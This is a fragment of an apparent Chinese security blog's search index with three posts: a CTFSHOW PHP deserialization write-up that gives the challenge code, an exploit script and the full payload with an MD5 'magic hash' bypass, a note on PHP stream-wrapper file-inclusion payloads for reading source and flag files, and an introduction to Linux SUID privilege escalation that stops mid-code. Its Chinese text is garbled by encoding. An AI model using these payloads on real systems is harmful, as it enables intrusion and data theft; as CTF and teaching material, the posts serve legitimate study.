class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ­¤åœ°é˜´é˜³äºŒæ°”ç•¥æ˜¾è™šæµ®ï¼ŒåŠ ä¸Šåˆšåˆšå¸¦å…¥çš„é˜³æ°”ï¼Œæˆ–å¯å€Ÿæ­¤éé€ƒï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$yin</span>=<span class="string">&quot;s214587387a&quot;</span>;</span><br><span class="line">    <span class="variable">$yang</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$yin</span>)==<span class="variable">$yang</span>&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$yin</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$yang</span>))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;å“¦ï¼Ÿåˆä¸€ä¸ªä¸ä¿¡å¤©å‘½ä¹‹äººï¼Ÿè¡Œäº†ï¼Œæ‹¿äº†ä¸œè¥¿é€Ÿé€Ÿç¦»å¼€å§&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Huoyanjinjing</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$huoyan</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$jinjing</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$huo</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;huoyan=<span class="string">&quot;ç«çœ¼èƒ½æ´å¯Ÿä¸€åˆ‡é‚ªç¥Ÿï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;huoyan-&gt;jinjing;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;jinjing=<span class="string">&quot;é‡‘ç›èƒ½çœ‹ç ´ä¸–é—´è¿·æƒ˜ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;huoyan-&gt;jinjing;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dinghaishenzhen</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$Jindou</span>=<span class="string">&quot;ä¸€ä¸ªç­‹æ–—èƒ½ç¿»åä¸‡å…«åƒé‡Œï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$yun</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$f</span>=<span class="variable language_">$this</span>-&gt;yun;</span><br><span class="line">    <span class="variable">$f</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ä½ çœŸçš„é€ƒå‡ºå»äº†å—ï¼Ÿå¤©å‘½äººï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jingdouyun</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$Qishier</span>=<span class="number">72</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$bian</span>=<span class="string">&quot;çœ‹ä¿ºè€å­™ä¸ƒåäºŒå˜ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸‰æ›´æ•²é—¨ï¼Œè©æè€ç¥–é€æˆ‘ç­‹æ–—äº‘...&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">Jindouyun</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tianmingren</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$tianming</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ren</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è¿·é€”ä¸­çš„ç¾”ç¾Šï¼Œä½ ç›¸ä¿¡å¤©å‘½å—ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tianming;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Wukong&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;å¼€å±€ä¸€æ ¹æ£ï¼Œè£…å¤‡å…¨é æ‰“ã€‚&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°±æ˜¯gcå›æ”¶æœºåˆ¶åŠ ä¸Šååºåˆ—åŒ–</p><p>é“¾å­å¾ˆç®€å•</p><p>ç›´æ¥ä¸Šexpäº†</p><?phperror_reporting(0);# å¸®å¤©å‘½äººæœé›†æ³•å®ï¼Œé‡è·é½å¤©ä¹‹å§¿ï¼<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wuzhishan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zhi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shan</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Huoyanjinjing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huoyan</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$jinjing</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dinghaishenzhen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Jindou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yun</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tianmingren</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tianming</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ren</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Tianmingren</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming=<span class="keyword">new</span> <span class="title class_">Dinghaishenzhen</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming-&gt;yun= <span class="keyword">new</span> <span class="title class_">Huoyanjinjing</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming-&gt;yun-&gt;huoyan= <span class="keyword">new</span> <span class="title class_">Wuzhishan</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>å› ä¸ºè¿™é‡Œè¿˜å­˜åœ¨md5çš„ç»•è¿‡ ç›´æ¥è®©J=0e215962017æœ€åå› ä¸ºè¿˜è¦ç»•è¿‡å¼‚å¸¸å¤„ç† æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ååºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„ è®©ç¬¬äºŒä¸ªç´¢å¼•ä¸º0 å³å¯ç»•è¿‡payload<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:?J=0e215962017</span><br><span class="line"></span><br><span class="line">POST=Wukong=a:2:&#123;i:0;O:11:&quot;Tianmingren&quot;:2:&#123;s:8:&quot;tianming&quot;;O:15:&quot;Dinghaishenzhen&quot;:2:&#123;s:6:&quot;Jindou&quot;;N;s:3:&quot;yun&quot;;O:13:&quot;Huoyanjinjing&quot;:2:&#123;s:6:&quot;huoyan&quot;;O:9:&quot;Wuzhishan&quot;:3:&#123;s:2:&quot;wu&quot;;N;s:3:&quot;zhi&quot;;N;s:4:&quot;shan&quot;;N;&#125;s:7:&quot;jinjing&quot;;N;&#125;&#125;s:3:&quot;ren&quot;;N;&#125;i:0;i:0;&#125;</span><br></pre></td></tr></table></figure>### CTFSHOWå·ç‹æ¯[easy unserialize]]]></content>
      
      
      <categories>
          
          <category> unserialize </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php ä¼ªåè®®</title>
      <link href="/2024/11/16/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2024/11/16/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copyincludeã€<span class="keyword">require</span>ã€<span class="keyword">include_once</span>ã€<span class="keyword">require_once</span>ã€highlight_file</span><br><span class="line">show_source ã€readfile ã€file_get_contents ã€fopen ã€file</span><br></pre></td></tr></table></figure><p>æœ‰å“ªäº›ä¼ªåè®®ï¼š</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">Copyfile:<span class="comment">// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line">http:<span class="comment">// â€” è®¿é—® HTTP(s) ç½‘å€</span></span><br><span class="line">ftp:<span class="comment">// â€” è®¿é—® FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</span></span><br><span class="line">zlib:<span class="comment">// â€” å‹ç¼©æµ</span></span><br><span class="line"><span class="keyword">data</span>:<span class="comment">// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span></span><br><span class="line">glob:<span class="comment">// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line">phar:<span class="comment">// â€” PHP å½’æ¡£</span></span><br><span class="line">ssh2:<span class="comment">// â€” Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// â€” RAR</span></span><br><span class="line">ogg:<span class="comment">// â€” éŸ³é¢‘æµ</span></span><br><span class="line"><span class="keyword">expect</span>:<span class="comment">// â€” å¤„ç†äº¤äº’å¼çš„æµ</span></span><br></pre></td></tr></table></figure><h4 id="2-1-php-filter"><a href="#2-1-php-filter" class="headerlink" title="2.1 php:&#x2F;&#x2F;filter"></a>2.1 php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filterç”¨äºè¯»å–æºç ï¼Œphp:&#x2F;&#x2F;inputç”¨äºæ‰§è¡Œphpä»£ç </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Copy?page=php://filter/read=convert.base64-encode/resource=../flag.php</span><br></pre></td></tr></table></figure><h4 id="2-2-file-åè®®"><a href="#2-2-file-åè®®" class="headerlink" title="2.2 file:&#x2F;&#x2F;åè®®"></a>2.2 file:&#x2F;&#x2F;åè®®</h4><p>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“</p><p>å³file:&#x2F;&#x2F; [æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">Copy?path=file:<span class="regexp">//</span><span class="regexp">/var/</span>www/html/flag.txt</span><br></pre></td></tr></table></figure><h4 id="2-3-php-input"><a href="#2-3-php-input" class="headerlink" title="2.3 php:&#x2F;&#x2F;input"></a>2.3 php:&#x2F;&#x2F;input</h4><p>php:&#x2F;&#x2F;input å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œ</p><p>php:&#x2F;&#x2F;input å¯ä»¥ç”¨æ¥ç”Ÿæˆä¸€å¥è¯</p><p>åˆ©ç”¨è¯¥æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™å…¥phpæ–‡ä»¶ï¼Œè¾“å…¥file&#x3D;php:&#x2F;&#x2F;inputï¼Œç„¶åä½¿ç”¨burpæŠ“åŒ…ï¼Œå†™å…¥phpä»£ç ï¼š</p><h4 id="2-4-data-åè®®"><a href="#2-4-data-åè®®" class="headerlink" title="2.4 data:&#x2F;&#x2F;åè®®"></a>2.4 data:&#x2F;&#x2F;åè®®</h4><p>åˆ©ç”¨data:&#x2F;&#x2F; ä¼ªåè®®å¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼Œä¾‹å¦‚æ‰§è¡Œphpinfo()å‡½æ•°ï¼š</p><h4 id="2-5-zip-bzip2-zlib-åè®®"><a href="#2-5-zip-bzip2-zlib-åè®®" class="headerlink" title="2.5 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;åè®®"></a>2.5 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;åè®®</h4><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œä¸éœ€è¦æŒ‡å®šåç¼€å</p><p>å¦‚æœç½‘ç«™å…è®¸æˆ‘ä»¬ä¸Šä¼ å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†phpæ–‡ä»¶å‹ç¼©åè¿›è¡Œä¸Šä¼ ï¼Œå†é€šè¿‡zip:&#x2F;&#x2F;åè®®æ‰§è¡Œã€‚</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731728678644.png"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ææƒ</title>
      <link href="/2024/11/14/%E6%8F%90%E6%9D%83/"/>
      <url>/2024/11/14/%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="UGO"><a href="#UGO" class="headerlink" title="UGO"></a>UGO</h1><p>é¦–å…ˆç®€å•äº†è§£ä¸‹UGO</p><p><strong>U</strong>ï¼ˆUserï¼‰ï¼šæ–‡ä»¶ä¸»äººï¼ˆæ¯”å¦‚ä½ åˆ›å»ºçš„æ–‡ä»¶ï¼Œä½ å°±æ˜¯Uï¼‰</p><p><strong>G</strong>ï¼ˆGroupï¼‰ï¼šæ–‡ä»¶æ‰€å±çš„â€œå°å›¢é˜Ÿâ€ï¼ˆæ¯”å¦‚è´¢åŠ¡éƒ¨çš„æ–‡ä»¶ï¼ŒGå°±æ˜¯è´¢åŠ¡ç»„ï¼‰</p><p><strong>O</strong>ï¼ˆOthersï¼‰ï¼šæ—¢ä¸æ˜¯ä¸»äººä¹Ÿä¸åœ¨å›¢é˜Ÿé‡Œçš„å…¶ä»–äºº</p><ul><li>ä¸¾ä¸ªæ —å­ğŸŒ°ï¼šä½ å†™äº†ä¸ªå·¥èµ„è¡¨æ–‡ä»¶ï¼ŒUæ˜¯ä½ è‡ªå·±ï¼ˆèƒ½æ”¹ï¼‰ï¼ŒGæ˜¯è´¢åŠ¡éƒ¨ï¼ˆåªèƒ½çœ‹ï¼‰ï¼ŒOæ˜¯å…¶ä»–éƒ¨é—¨ï¼ˆå®Œå…¨æ²¡æƒé™ï¼‰</li></ul><h3 id="1ã€æ¦‚è¿°"><a href="#1ã€æ¦‚è¿°" class="headerlink" title="1ã€æ¦‚è¿°"></a>1ã€æ¦‚è¿°</h3><ul><li><p>æ–‡ä»¶æƒé™è®¾ç½®ï¼šè®¾ç½®èµ‹äºˆæŸä¸ªç”¨æˆ·æˆ–ç»„èƒ½å¤Ÿä»¥ä½•ç§æ–¹å¼è®¿é—®æŸä¸ªæ–‡ä»¶</p></li><li><p>æƒé™å¯¹è±¡ï¼šå±ä¸»uã€å±ç»„gã€å…¶ä»–äººoã€æ‰€æœ‰äººa(u+g+o)</p></li><li><p>æƒé™ç±»å‹ï¼šè¯»ï¼ˆr&#x3D;4ï¼‰ã€å†™ï¼ˆw&#x3D;2)ã€æ‰§è¡Œï¼ˆx&#x3D;1)</p><p>æ‰€è°“çš„ugoææƒå…¶å®æ˜¯ä¿®æ”¹å…¶æƒé™</p><p>ä¾‹å¦‚ç”¨<code>chmod</code>å‘½ä»¤ï¼ˆæ¯”å¦‚<code>chmod o+w å·¥èµ„è¡¨.txt</code>å°±æ˜¯è®©å…¶ä»–äººä¹Ÿèƒ½ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶ï¼‰</p><p>é‚£ä¹ˆå½“ç®¡ç†å‘˜æœ‰æ—¶å€™é…ç½®ä¸å½“ å°†&#x2F;etc&#x2F;passwd æ–‡ä»¶ æƒé™æ”¹æˆo+rï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½œä¸ºæ™®é€šç”¨æˆ·çš„è¯å°±èƒ½å¤Ÿçœ‹åˆ°å¯†ç çš„å“ˆå¸Œå€¼ï¼Œç»™æ™®é€šç”¨æˆ·çš„è„šæœ¬åŠ ä¸Š<code>u+s</code>ï¼ˆSUIDï¼‰ï¼Œè¿è¡Œæ—¶å°±å˜rootæƒé™</p><p>è¿™ç§<strong>é€šè¿‡æ”¹UGOæƒé™æ‰©å¤§è®¿é—®èŒƒå›´</strong>çš„æ“ä½œï¼Œæ‰æ˜¯â€œåˆ©ç”¨UGOæœºåˆ¶ææƒâ€çš„æœ¬è´¨</p></li></ul><h1 id="Linux-suidææƒ"><a href="#Linux-suidææƒ" class="headerlink" title="Linux suidææƒ"></a>Linux suidææƒ</h1><h2 id="ä»€ä¹ˆæ˜¯suid"><a href="#ä»€ä¹ˆæ˜¯suid" class="headerlink" title="ä»€ä¹ˆæ˜¯suid"></a>ä»€ä¹ˆæ˜¯suid</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suid(set uid)æ˜¯linuxä¸­çš„ä¸€ç§ç‰¹æ®Šæƒé™ï¼Œsuidå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥åˆ©ç”¨suidææƒçš„æ ¸å¿ƒå°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„suidçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿è¡Œè¯¥æ–‡ä»¶çš„æ—¶å€™å°±å¾—è·å¾—rootç”¨æˆ·çš„èº«ä»½äº†ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨Linuxæ“ä½œç³»ç»Ÿä¸­ï¼Œä¸ºäº†æœ‰æ•ˆç®¡ç†å’Œç»´æŠ¤ç”¨æˆ·åŠç”¨æˆ·ç»„çš„å®‰å…¨æ€§å’Œæƒé™æ§åˆ¶ï¼Œç³»ç»Ÿå¼•å…¥äº†ä¸‰ä¸ªå…³é”®é…ç½®æ–‡ä»¶æ¥å­˜å‚¨ç›¸å…³ä¿¡æ¯ï¼š</p><ul><li><code>/etc/passwd</code>ï¼šæ­¤æ–‡ä»¶å­˜å‚¨äº†ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºç”¨æˆ·åã€ç”¨æˆ·IDï¼ˆUIDï¼‰ã€é»˜è®¤ç»„IDï¼ˆGIDï¼‰ã€ç”¨æˆ·æè¿°ã€å®¶ç›®å½•è·¯å¾„ä»¥åŠç™»å½•Shellç­‰ã€‚</li><li><code>/etc/shadow</code>ï¼šä¸ºäº†å¢å¼ºå®‰å…¨æ€§ï¼Œå®é™…çš„ç”¨æˆ·å¯†ç å“ˆå¸Œå€¼è¢«å­˜å‚¨åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œè€Œä¸æ˜¯åœ¨ <code>/etc/passwd</code> ä¸­å…¬å¼€å¯è§ã€‚åªæœ‰å…·æœ‰é€‚å½“æƒé™çš„è¿›ç¨‹æ‰èƒ½è¯»å–æ­¤æ–‡ä»¶ã€‚</li><li><code>/etc/group</code>ï¼šè¯¥æ–‡ä»¶è®°å½•äº†ç³»ç»Ÿä¸­å„ä¸ªç”¨æˆ·ç»„çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç»„åã€ç»„å¯†ç ï¼ˆå¾ˆå°‘ä½¿ç”¨ï¼‰ã€ç»„IDï¼ˆGIDï¼‰ä»¥åŠå±äºè¯¥ç»„çš„æˆå‘˜åˆ—è¡¨ã€‚</li></ul><p>æ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶éƒ½åŒ…å«äº†ä¸ç”¨æˆ·å’Œç»„ç›¸å…³çš„å…ƒæ•°æ®ï¼Œè¿™äº›ä¿¡æ¯å®šä¹‰äº†æ–‡ä»¶çš„æ‰€æœ‰æƒå’Œè®¿é—®æƒé™ã€‚å…·ä½“æ¥è¯´ï¼Œæ¯ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼ˆinodeï¼‰ä¸­éƒ½ä¼šè®°å½•æ–‡ä»¶çš„æ‰€æœ‰è€…ï¼ˆç”¨æˆ·ï¼‰å’Œæ‰€å±ç»„ï¼Œä»¥åŠç›¸åº”çš„è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€‚</p><p>å…³äº <code>/etc/passwd</code> æ–‡ä»¶çš„æ ¼å¼ï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªç”¨æˆ·ï¼Œç”±ä¸ƒä¸ªå­—æ®µç»„æˆï¼Œå„å­—æ®µä¹‹é—´ç”¨å†’å·ï¼ˆ:ï¼‰åˆ†éš”ï¼š</p><ol><li><strong>ç”¨æˆ·å</strong>ï¼ˆUser Nameï¼‰ï¼šè¿™æ˜¯ç”¨æˆ·ç™»å½•ç³»ç»Ÿæ—¶ä½¿ç”¨çš„åç§°ã€‚</li><li><strong>å¯†ç å ä½ç¬¦</strong>ï¼ˆPassword Placeholderï¼‰ï¼šæ—©æœŸç‰ˆæœ¬çš„ Linux ç³»ç»Ÿä¸­ï¼Œè¿™é‡Œä¼šç›´æ¥å­˜å‚¨åŠ å¯†åçš„å¯†ç ï¼Œä½†ç°åœ¨é€šå¸¸åªæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼ˆå¦‚ <code>x</code> æˆ– <code>*</code>ï¼‰ï¼Œå®é™…å¯†ç è¢«å®‰å…¨åœ°å­˜å‚¨åœ¨ <code>/etc/shadow</code> ä¸­ã€‚</li><li><strong>ç”¨æˆ·IDï¼ˆUIDï¼‰</strong>ï¼šæ¯ä¸ªç”¨æˆ·åœ¨ç³»ç»Ÿä¸­éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ•°å­—æ ‡è¯†ç¬¦ã€‚</li><li><strong>ä¸»ç»„IDï¼ˆGIDï¼‰</strong>ï¼šç”¨æˆ·æ‰€å±çš„ä¸»è¦ç”¨æˆ·ç»„çš„IDã€‚</li><li><strong>ç”¨æˆ·æè¿°</strong>ï¼ˆUser Descriptionï¼‰ï¼šä¹Ÿç§°ä¸º GECOS å­—æ®µï¼Œé€šå¸¸åŒ…å«ç”¨æˆ·çš„å…¨åã€åŠå…¬å®¤å·ç ã€ç”µè¯ç­‰ä¿¡æ¯ã€‚</li><li><strong>å®¶ç›®å½•</strong>ï¼ˆHome Directoryï¼‰ï¼šç”¨æˆ·ç™»å½•åçš„å·¥ä½œç›®å½•è·¯å¾„ã€‚</li><li><strong>ç™»å½•Shell</strong>ï¼ˆLogin Shellï¼‰ï¼šç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨çš„å‘½ä»¤è§£é‡Šå™¨ã€‚ä¾‹å¦‚ï¼Œ<code>/bin/bash</code> è¡¨ç¤ºä½¿ç”¨ Bash shellï¼Œè€Œ <code>/sbin/nologin</code> åˆ™è¡¨ç¤ºè¯¥è´¦æˆ·ä¸å…è®¸ç™»å½•ã€‚</li></ol><p>é€šè¿‡è¿™æ ·çš„è®¾è®¡ï¼ŒLinux ç³»ç»Ÿèƒ½å¤Ÿå®ç°ç»†ç²’åº¦çš„æƒé™æ§åˆ¶ï¼Œç¡®ä¿ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ï¼ŒåŒæ—¶ä¹Ÿä¸ºç®¡ç†å‘˜æä¾›äº†å¼ºå¤§çš„å·¥å…·æ¥ç®¡ç†ç”¨æˆ·å’Œèµ„æºã€‚</p><p>example:</p><p>root:x:0:0:root:&#x2F;root:&#x2F;usr&#x2F;bin&#x2F;zsh<br>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin<br>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼ŒSUIDï¼ˆSet User IDï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶æƒé™ä½ï¼Œå…è®¸æ™®é€šç”¨æˆ·åœ¨æ‰§è¡Œç‰¹å®šç¨‹åºæ—¶ä¸´æ—¶è·å¾—è¯¥ç¨‹åºæ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ã€‚è¿™ä¸€æœºåˆ¶åœ¨æŸäº›æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚å…è®¸éç‰¹æƒç”¨æˆ·æ‰§è¡Œéœ€è¦æ›´é«˜æƒé™çš„æ“ä½œã€‚ç„¶è€Œï¼Œä¸å½“ä½¿ç”¨SUIDæƒé™å¯èƒ½ä¼šå¸¦æ¥ä¸¥é‡çš„å®‰å…¨é£é™©ï¼Œå› æ­¤åœ¨ç³»ç»Ÿç®¡ç†å’Œå®‰å…¨åŠ å›ºè¿‡ç¨‹ä¸­éœ€è¦ç‰¹åˆ«è°¨æ…ã€‚</p><h3 id="SUIDæƒé™è¯¦è§£"><a href="#SUIDæƒé™è¯¦è§£" class="headerlink" title="SUIDæƒé™è¯¦è§£"></a>SUIDæƒé™è¯¦è§£</h3><h4 id="å®šä¹‰ä¸ä½œç”¨"><a href="#å®šä¹‰ä¸ä½œç”¨" class="headerlink" title="å®šä¹‰ä¸ä½œç”¨"></a>å®šä¹‰ä¸ä½œç”¨</h4><p>SUIDæƒé™å…è®¸ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶åœ¨å…¶è¿è¡ŒæœŸé—´ï¼Œä½¿æ‰§è¡Œè¯¥æ–‡ä»¶çš„è¿›ç¨‹æ‹¥æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ï¼Œè€Œä¸æ˜¯æ‰§è¡Œè€…çš„æƒé™ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰è€…æ˜¯ <code>root</code> å¹¶ä¸”è®¾ç½®äº†SUIDä½ï¼Œé‚£ä¹ˆä»»ä½•ç”¨æˆ·åœ¨æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶ï¼Œéƒ½å°†è·å¾— <code>root</code> ç”¨æˆ·çš„æƒé™ã€‚</p><h4 id="å®ç°æ–¹å¼"><a href="#å®ç°æ–¹å¼" class="headerlink" title="å®ç°æ–¹å¼"></a>å®ç°æ–¹å¼</h4><p>åœ¨Linuxä¸­ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è®¾ç½®SUIDä½ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span 